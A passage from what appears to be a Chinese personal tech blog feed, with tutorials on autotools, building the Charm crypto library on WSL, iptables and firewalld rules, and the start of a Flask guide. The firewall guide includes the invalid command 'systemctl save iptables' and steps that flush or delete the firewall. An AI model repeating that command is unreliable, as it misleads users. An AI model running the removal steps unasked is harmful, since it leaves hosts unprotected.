class="line-numbers-rows"><span></span></span></code></pre><p>生成的 <code>aclocal.m4</code> 文件可能包含标准宏，例如对编译器检查、头文件检查等的支持。</p><h4 id="3-后续步骤"><a href="#3-后续步骤" class="headerlink" title="(3) 后续步骤"></a>(3) 后续步骤</h4><p>生成 <code>configure</code> 文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">autoconf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="4-自定义宏支持"><a href="#4-自定义宏支持" class="headerlink" title="4. 自定义宏支持"></a>4. 自定义宏支持</h3><p>如果你需要自定义宏，可以创建一个名为 <code>m4/</code> 的目录，并将宏文件放入其中。例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> m4<span class="token builtin class-name">echo</span> <span class="token string">'AC_DEFUN([MY_MACRO], [echo "This is my custom macro"])'</span> <span class="token operator">&gt;</span> m4/my_macro.m4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在 <code>configure.ac</code> 中引用：</p><pre class="line-numbers language-m4" data-language="m4"><code class="language-m4">AC_INIT([myproject], [1.0], [bug-report@example.com])AC_CONFIG_MACRO_DIR([m4])  # 指定宏目录AM_INIT_AUTOMAKEMY_MACROAC_OUTPUT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行以下命令，<code>aclocal</code> 会自动包含自定义宏：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aclocal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="三、完整实践示例"><a href="#三、完整实践示例" class="headerlink" title="三、完整实践示例"></a>三、完整实践示例</h2><p>假设我们有一个简单的项目：<br>目录结构如下：</p><pre class="line-numbers language-none"><code class="language-none">myproject/├── configure.ac├── Makefile.am├── src/│   ├── main.c│   ├── utils.c│   └── utils.h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下是构建流程：</p><ol><li><strong>生成初始文件</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">autoscan<span class="token function">mv</span> configure.scan configure.ac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><strong>完善 <code>configure.ac</code></strong></li></ol><pre class="line-numbers language-m4" data-language="m4"><code class="language-m4">AC_INIT([myproject], [1.0], [bug-report@example.com])AC_CONFIG_SRCDIR([src/main.c])AC_CONFIG_MACRO_DIR([m4])AM_INIT_AUTOMAKEAC_PROG_CCAC_OUTPUT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><strong>生成宏文件</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aclocal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>生成 <code>configure</code> 脚本</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">autoconfautomake --add-missing<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><strong>运行 <code>configure</code> 和编译</strong></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux编译charm库</title>
      <link href="/2024/11/20/linux-bian-yi-charm-ku/"/>
      <url>/2024/11/20/linux-bian-yi-charm-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="linux编译charm库"><a href="#linux编译charm库" class="headerlink" title="linux编译charm库"></a>linux编译charm库</h1><p>在 Windows 的 Linux 子系统 (WSL) 中使用 Ubuntu 编译安装 Charm 库的步骤如下：</p><hr><h3 id="基于-WSL-的-Charm-库安装教程"><a href="#基于-WSL-的-Charm-库安装教程" class="headerlink" title="基于 WSL 的 Charm 库安装教程"></a><strong>基于 WSL 的 Charm 库安装教程</strong></h3><h4 id="1-更新系统并安装依赖"><a href="#1-更新系统并安装依赖" class="headerlink" title="1. 更新系统并安装依赖"></a><strong>1. 更新系统并安装依赖</strong></h4><p>应用商店下载linux后执行<code>wsl --update</code></p><p>在 WSL Ubuntu 中，运行以下命令安装必要的编译工具和库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade <span class="token parameter variable">-y</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> build-essential python3 python3-dev python3-pip python3-setuptools <span class="token punctuation">\</span>                     libgmp-dev libssl-dev swig libpbc-dev <span class="token function">git</span> <span class="token function">wget</span> gcc <span class="token function">make</span> m4 flex bison<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的库可以一个一个单独安装，没有就去找源码安装，下面报安装错也能再安装，这里ubuntu版本最好不要太高，openssl我的是3.0.2没问题，gmp最高，openssl，python一般会自带，python我的是python3.10</p><hr><h4 id="2-安装-PBC-库"><a href="#2-安装-PBC-库" class="headerlink" title="2. 安装 PBC 库"></a><strong>2. 安装 PBC 库</strong></h4><p>PBC 是 Charm 的核心依赖之一，需要手动编译安装。</p><ol><li><p><strong>下载源码：</strong></p><p><a href="https://crypto.stanford.edu/pbc/download.html">PBC Library - Pairing-Based Cryptography - Downloads</a>下载第一个</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://crypto.stanford.edu/pbc/files/pbc-0.5.14.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pbc-0.5.14.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>编译和安装：</strong></p><p>进入解压的目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/lib"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/ld.so.conf.d/libpbc.conf<span class="token function">sudo</span> ldconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><hr><h4 id="3-下载并安装-Charm-库"><a href="#3-下载并安装-Charm-库" class="headerlink" title="3. 下载并安装 Charm 库"></a><strong>3. 下载并安装 Charm 库</strong></h4><ol><li><p><strong>下载源码：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/JHUISI/charm.git<span class="token builtin class-name">cd</span> charm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>配置安装路径：</strong></p><p>执行 <code>configure.sh</code> 脚本，指定 GMP 和 PBC 的安装路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure.sh<span class="token comment">#执行成功</span>Install prefix    /usr/localdata directory    /usr/local/share/charmbinary directory  /usr/local/binlibrary directory /usr/local/libconfig directory  /usr/local/etcSource path       /home/hero/charmCFLAGS            <span class="token parameter variable">-O2</span> <span class="token parameter variable">-g</span>CHARM_CFLAGS       <span class="token parameter variable">-m64</span> <span class="token parameter variable">-Wall</span> <span class="token parameter variable">-Wundef</span> -Wwrite-strings -Wmissing-prototypes  -fstack-protector-all -Wendif-labels -Wmissing-include-dirs -Wempty-body -Wnested-externs -Wformat-security -Wformat-y2k -Winit-self -Wignored-qualifiers -Wold-style-declaration -Wold-style-definition -Wtype-limitsLDFLAGS           <span class="token parameter variable">-m64</span><span class="token function">make</span>              <span class="token function">make</span>python            /usr/bin/python3python-config     /usr/bin/python3-configbuild_ext options build_ext<span class="token function">install</span>           <span class="token function">install</span><span class="token function">host</span> CPU          x86_64<span class="token function">wget</span>              /usr/bin/wgetgprof enabled     noprofiler          nostatic build      no<span class="token parameter variable">-Werror</span> enabled   nointeger module    <span class="token function">yes</span>ecc module        <span class="token function">yes</span>pairing module    <span class="token function">yes</span>disable benchmark nolibm found        <span class="token function">yes</span>libgmp found      <span class="token function">yes</span>libpbc found      <span class="token function">yes</span>libcrypto found   <span class="token function">yes</span>Documentation     no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>编译和安装：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span class="token comment">#执行成功</span>copying build/lib.linux-x86_64-3.8/charm/core/math/pairing.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/mathcopying build/lib.linux-x86_64-3.8/charm/core/math/integer.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/mathcopying build/lib.linux-x86_64-3.8/charm/core/math/elliptic_curve.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/mathcopying build/lib.linux-x86_64-3.8/charm/core/benchmark.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/corecopying build/lib.linux-x86_64-3.8/charm/core/crypto/cryptobase.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/cryptocopying build/lib.linux-x86_64-3.8/charm/core/crypto/AES.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/cryptocopying build/lib.linux-x86_64-3.8/charm/core/crypto/DES.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/cryptocopying build/lib.linux-x86_64-3.8/charm/core/crypto/DES3.cpython-38-x86_64-linux-gnu.so -<span class="token operator">&gt;</span> charm/core/cryptoComplete<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment">#执行成功</span>Installed /usr/local/lib/python3.8/dist-packages/attrs-25.3.0-py3.8.eggSearching <span class="token keyword">for</span> <span class="token assign-left variable">setuptools</span><span class="token operator">==</span><span class="token number">45.2</span>.0Best match: setuptools <span class="token number">45.2</span>.0Adding setuptools <span class="token number">45.2</span>.0 to easy-install.pth <span class="token function">file</span>Installing easy_install script to /usr/local/binUsing /usr/lib/python3/dist-packagesFinished processing dependencies <span class="token keyword">for</span> Charm-Crypto<span class="token operator">==</span><span class="token number">0.50</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>import charm</code>判断安装是否成功</p></li></ol><hr><p>PS：conda环境下会使用conda自带的环境，可能会编译出错，需要禁用，执行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /root/miniconda3/compiler_compat /root/miniconda3/compiler_compat.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面直接改回就行了</p><p>报错就看报错信息，可以参考官方<a href="https://jhuisi.github.io/charm/install_source.html">Platform Install Manual — Charm-Crypto 0.50 documentation</a></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux防火墙规则</title>
      <link href="/2024/11/10/linux-fang-huo-qiang-gui-ze/"/>
      <url>/2024/11/10/linux-fang-huo-qiang-gui-ze/</url>
      
        <content type="html"><![CDATA[<h1 id="linux防火墙规则"><a href="#linux防火墙规则" class="headerlink" title="linux防火墙规则"></a>linux防火墙规则</h1><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><h4 id="1-查看当前防火墙规则"><a href="#1-查看当前防火墙规则" class="headerlink" title="1. 查看当前防火墙规则"></a>1. 查看当前防火墙规则</h4><p><strong>使用 iptables 查看规则：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-L</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将列出所有的链和规则。<code>-L</code> 参数代表列出（List）。</p><p><strong>查看详细信息：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-L</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-n</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-v</code> 参数代表详细（Verbose），<code>-n</code> 参数代表不解析服务名称（Numeric）。</p><p><strong>查看特定链的规则：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-L</span> INPUT <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-配置防火墙规则"><a href="#2-配置防火墙规则" class="headerlink" title="2. 配置防火墙规则"></a>2. 配置防火墙规则</h4><p><strong>添加规则允许 SSH：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令将添加一条规则到 <code>INPUT</code> 链，允许所有进入的 TCP 流量到达端口 22（SSH）。</p><p><strong>添加规则拒绝特定 IP：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.1.100 <span class="token parameter variable">-j</span> DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令将拒绝来自 IP 地址 <code>192.168.1.100</code> 的所有流量。</p><p><strong>添加规则允许来自特定 IP 的 HTTP 访问：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.1.101 <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>添加规则允许已建立的连接：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-m</span> state <span class="token parameter variable">--state</span> ESTABLISHED,RELATED <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>添加规则允许出站流量：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-删除防火墙规则"><a href="#3-删除防火墙规则" class="headerlink" title="3. 删除防火墙规则"></a>3. 删除防火墙规则</h4><p><strong>删除特定规则：</strong> 要删除规则，你需要知道规则的编号。使用 <code>-L --line-numbers</code> 查看规则编号：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-L</span> --line-numbers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后删除规则，例如删除编号为 3 的规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-D</span> INPUT <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-保存防火墙规则"><a href="#4-保存防火墙规则" class="headerlink" title="4. 保存防火墙规则"></a>4. 保存防火墙规则</h4><p><strong>保存 iptables 规则：</strong> 在 Debian/Ubuntu 上，你可以使用 <code>iptables-persistent</code> 包来保存规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> iptables-persistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 CentOS/RHEL 上，你可以使用 <code>service</code> 或 <code>systemctl</code> 命令来保存规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> iptables save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl save iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-恢复防火墙规则"><a href="#5-恢复防火墙规则" class="headerlink" title="5. 恢复防火墙规则"></a>5. 恢复防火墙规则</h4><p><strong>在系统启动时恢复 iptables 规则：</strong> 在 Debian/Ubuntu 上，安装 <code>iptables-persistent</code> 后，规则会自动在启动时恢复。在 CentOS/RHEL 上，你需要手动保存规则，并在 <code>/etc/rc.d/rc.local</code> 或使用 <code>systemctl</code> 配置启动脚本中添加恢复规则的命令。</p><h4 id="6-重置防火墙规则"><a href="#6-重置防火墙规则" class="headerlink" title="6. 重置防火墙规则"></a>6. 重置防火墙规则</h4><p><strong>重置 iptables 到默认设置：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iptables <span class="token parameter variable">-F</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-X</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-F</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-X</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>-F</code> 代表清空规则，<code>-X</code> 代表清空用户自定义链。</p><h4 id="7-防火墙规则的持久化"><a href="#7-防火墙规则的持久化" class="headerlink" title="7. 防火墙规则的持久化"></a>7. 防火墙规则的持久化</h4><p><strong>Ubuntu/Debian：</strong> 安装 <code>iptables-persistent</code> 包后，它会在 <code>/etc/iptables/rules.v4</code> 文件中保存规则。</p><p><strong>CentOS/RHEL：</strong> 你可以使用 <code>iptables-services</code> 包来管理 iptables 的持久化：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> iptables-services<span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> iptables<span class="token function">sudo</span> <span class="token function">service</span> iptables save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="8-查看和管理系统服务"><a href="#8-查看和管理系统服务" class="headerlink" title="8. 查看和管理系统服务"></a>8. 查看和管理系统服务</h4><p><strong>查看所有服务：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl list-units <span class="token parameter variable">--type</span><span class="token operator">=</span>service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>启动/停止服务：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start iptables<span class="token function">sudo</span> systemctl stop iptables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>设置服务开机启动：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>禁用服务开机启动：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl disable iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上是 Linux 防火墙规则的完整指南，包括查看、配置、删除、保存、恢复和重置防火墙规则等操作。请根据你的具体需求和 Linux 发行版进行相应的操作。</p><h4 id="9-关闭或强制删除防火墙"><a href="#9-关闭或强制删除防火墙" class="headerlink" title="9. 关闭或强制删除防火墙"></a>9. 关闭或强制删除防火墙</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> purge netfilter-persistent <span class="token operator">&amp;&amp;</span> <span class="token function">reboot</span>或 <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc/iptables <span class="token operator">&amp;&amp;</span> <span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="firewalld"><a href="#firewalld" class="headerlink" title="firewalld"></a>firewalld</h2><h4 id="1-Firewalld-简介"><a href="#1-Firewalld-简介" class="headerlink" title="1. Firewalld 简介"></a>1. Firewalld 简介</h4><p><code>Firewalld</code> 是一个动态防火墙管理工具，它提供了基于区域（zone）和服务（service）的简化配置界面，使得管理防火墙规则更加容易。它支持动态更新防火墙规则，可以在运行时添加、删除、修改规则，而不需要重新加载整个防火墙配置。</p><h4 id="2-服务的启动、停止和状态查看"><a href="#2-服务的启动、停止和状态查看" class="headerlink" title="2. 服务的启动、停止和状态查看"></a>2. 服务的启动、停止和状态查看</h4><ul><li><p>启动防火墙：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>停止防火墙：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置防火墙开机启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>禁用防火墙开机启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看防火墙状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl status firewalld<span class="token comment"># 或者</span><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--state</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>查看版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="3-查看和设置默认区域"><a href="#3-查看和设置默认区域" class="headerlink" title="3. 查看和设置默认区域"></a>3. 查看和设置默认区域</h4><ul><li><p>查看默认区域：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --get-default-zone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看所有可用的区域：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --get-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看当前活动区域：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --get-active-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置默认区域：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --set-default-zone<span class="token operator">=</span>your_zone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中your_zone是你想要设置的默认区域的名称，比如public、internal、dmz等。</p></li></ul><h4 id="4-使用-firewall-cmd-命令行工具进行规则配置"><a href="#4-使用-firewall-cmd-命令行工具进行规则配置" class="headerlink" title="4. 使用 firewall-cmd 命令行工具进行规则配置"></a>4. 使用 firewall-cmd 命令行工具进行规则配置</h4><ul><li><p>添加规则开放端口：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">80</span>/tcp <span class="token parameter variable">--permanent</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>添加规则允许服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --add-service<span class="token operator">=</span>http <span class="token parameter variable">--permanent</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>删除规则：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>public --remove-service<span class="token operator">=</span>http <span class="token parameter variable">--permanent</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="5-重新加载防火墙配置"><a href="#5-重新加载防火墙配置" class="headerlink" title="5. 重新加载防火墙配置"></a>5. 重新加载防火墙配置</h4><p>为了使永久配置生效，需要重新加载 <code>firewalld</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--reload</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-查询已开放的端口、已允许的服务"><a href="#6-查询已开放的端口、已允许的服务" class="headerlink" title="6. 查询已开放的端口、已允许的服务"></a>6. 查询已开放的端口、已允许的服务</h4><ul><li><p>查询特定区域支持的所有特性：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>zone_name --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，zone_name是你要查询的区域的名称。</p></li><li><p>查询特定区域支持的所有服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>zone_name --list-services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查询特定区域开放的端口：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>zone_name --list-ports<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="7-绑定接口到特定区域"><a href="#7-绑定接口到特定区域" class="headerlink" title="7. 绑定接口到特定区域"></a>7. 绑定接口到特定区域</h4><ul><li><p>永久更改接口的区域绑定：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--zone</span><span class="token operator">=</span>home --add-interface<span class="token operator">=</span>eth0 <span class="token parameter variable">--permanent</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了使永久更改生效，需要重新加载firewalld</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd <span class="token parameter variable">--reload</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次验证更改：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --get-active-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask教程</title>
      <link href="/2024/11/06/flask-jiao-cheng/"/>
      <url>/2024/11/06/flask-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="flask教程"><a href="#flask教程" class="headerlink" title="flask教程"></a>flask教程</h1><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><h3 id="中型"><a href="#中型" class="headerlink" title="中型"></a>中型</h3><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">my_flask_project/├── app/                     # 核心应用文件夹│   ├── __init__.py          # 应用初始化│   ├── routes.py            # 路由定义│   ├── models.py            # 数据模型（如需要）│   ├── templates/           # HTML 模板│   │   └── index.html│   └── static/              # 静态文件│       ├── css/│       │   └── style.css│       └── js/│           └── script.js├── config.py                # 配置文件├── run.py                   # 启动文件└── requirements.txt         # 依赖文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="app-init-py"><a href="#app-init-py" class="headerlink" title="app/__init__.py"></a><code>app/__init__.py</code></h4><p>在 <code>__init__.py</code> 中创建并初始化 Flask 应用，加载配置，并从 <code>routes.py</code> 注册路由。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">def</span> <span class="token function">create_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>    app<span class="token punctuation">.</span>config<span class="token 